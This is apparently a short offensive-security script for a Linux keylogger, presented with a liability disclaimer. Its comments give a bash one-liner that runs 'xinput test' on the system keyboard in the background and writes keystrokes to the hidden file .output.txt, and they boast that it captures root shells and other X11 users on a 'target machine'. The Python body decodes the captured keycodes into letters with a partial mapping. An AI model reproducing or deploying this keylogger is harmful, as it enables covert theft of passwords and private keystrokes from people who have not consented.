# I claim no responsibility for illegal usage of this tool. Use this on a private network you own or seek permission from your client before testing against live production machines. 

#Using a bash based keylogger which attaches to running keyboard in X11 session. Stores this into a hidden file then run a Python script with mappings in order to work out the text.
#test $(xinput list | grep 'AT Translated' | sed 's/.*id=\([0-9]*\).*/\1/') > .output.txt & 
#is capable to log output from root shells and any other user who is using X11 on the target machine.#the 'hidden' file
f = open('.output.txt','r') 
#the file up into lines
lines = f.readlines() 

#each line inside the file
for line in lines:
    l = line.split(' ')
    if "release" in l[1]:
        continue
    if l[4] == '36':
        print('Enter')
    elif l[4] == '38':
        print('a')
    elif l[4] == '56':
        print('b')
    elif l[4] == '54':
        print('c')
    elif l[4] == '40':
        print('d')
    elif l[4] == '26':
        print('e')
    elif l[4] == '41':
        print('f')
    elif l[4] == '42':
        print('g')
    elif l[4] == '43':
        print('h')
    elif l[4] == '31':
        print('i')
    elif l[4] == '44':
        print('j')
    elif l[4] == '45':
        print('k')
    elif l[4] == '46':
        print('l')
    elif l[4] == '58':
        print('m')
    elif l[4] == '57':
        print('n')
    elif l[4] == '32':
        print('o')
    elif l[4] == '33':
        print('p')
    elif l[4] == '24':
        print('q')
    elif l[4] == '27':
        print('r')
    elif l[4] == '39':
        print('s')
    elif l[4] == '28':
        print('t')
    elif l[4] == '30':
        print('u')
    elif l[4] == '55':
        print('v')
    elif l[4] == '25':
        print('w')
    elif l[4] == '53':
        print('x')
    elif l[4] == '29':
        print('y')
    elif l[4] == '52':
        print('z')
    elif l[4] == '18':
        print('9')
